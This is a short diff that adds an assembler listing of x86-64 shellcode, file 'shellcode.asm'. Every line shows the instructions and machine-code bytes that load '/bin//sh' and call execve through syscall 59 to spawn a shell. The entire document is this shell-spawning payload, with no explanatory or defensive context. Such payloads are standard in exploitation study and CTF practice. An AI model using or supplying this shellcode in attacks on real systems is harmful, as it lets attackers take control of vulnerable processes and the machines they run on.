@@ -1,0 +1,14 @@
+     1                                 %line 1+1 shellcode.asm
+     2                                 [global _start]
+     3                                 
+     4                                 [section .text]
+     5                                 _start:
+     6 00000000 52                      push rdx
+     7 00000001 4831F6                  xor rsi, rsi
+     8 00000004 48BB2F62696E2F2F73-     mov rbx,'/bin//sh'
+     9 00000004 68                 
+    10 0000000E 53                      push rbx
+    11 0000000F 54                      push rsp
+    12 00000010 5F                      pop rdi
+    13 00000011 B03B                    mov al, 59
+    14 00000013 0F05                    syscall
